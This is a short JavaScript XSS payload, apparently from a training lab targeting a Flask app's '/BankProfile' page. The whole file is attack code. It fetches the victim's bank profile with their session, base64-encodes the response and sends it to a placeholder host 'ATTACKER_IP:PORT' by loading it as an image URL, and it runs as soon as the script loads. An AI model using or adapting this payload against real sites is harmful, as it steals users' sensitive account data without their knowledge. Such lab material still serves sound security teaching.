// sensitive data through XSS payload


function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}




function stealData()
{
	var uri = "http://flaskapp:5000/BankProfile";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);
			
			//console.log(dataResponse.innerHTML)
			var exfilData  = btoa(dataResponse);
			var downloadImage = new Image();

		
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://ATTACKER_IP:PORT/exfil/" + exfilData + ".jpg";
		}
	}
}



stealData();
